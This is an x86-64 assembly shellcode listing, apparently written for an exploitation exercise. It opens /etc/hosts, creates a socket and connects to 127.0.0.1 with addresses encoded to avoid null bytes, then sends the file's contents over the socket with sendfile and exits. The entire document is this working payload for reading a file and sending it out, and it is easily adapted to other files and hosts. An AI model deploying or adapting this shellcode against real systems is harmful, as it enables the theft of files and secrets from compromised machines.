.globl _start
_start:
	// open
	movw $0x7374, %r11w             /* ts */
	push %r11
	movq $0x736f682f6374652f, %r11  /* /etc/hos */
	push %r11
	lea 0(%rsp), %rdi
	xor %rsi, %rsi
	addb $2, %al
	syscall
	push %rax												/* save fd for /etc/hosts */

	// socket
	xor %rdi, %rdi
	mov $0x02, %rdi
	mov %rdi, %rsi
	xor %rdx, %rdx
	mov $41, %rax
	syscall
	push %rax                       /* save socket fd */

	// connect
	mov %rax, %rdi
	xor %rsi, %rsi
	xor %r10, %r10
	mov $0xfeffff80, %r10           /* 127.0.0.1 ; cuz it has zeros */
	not %r10
	push %r10
	push $0x1f40
	push $0x02
	mov $0x14, %rdx
	lea 0(%rsp), %rsi
	mov $42, %rax
	syscall
	pop %rdi                        /* clean the stack */
	pop %rdi
	pop %rdi

	// sendfile
	pop %rdi                        /* socket fd */
	pop %rsi                        /* file fd */
	xor %rdx, %rdx
	mov $0xffff, %r10
	mov $40, %al
	syscall

	// exit
	xor %rdi, %rdi
	mov $3, %dl
	xor %rax, %rax
	mov $60, %al
	syscall
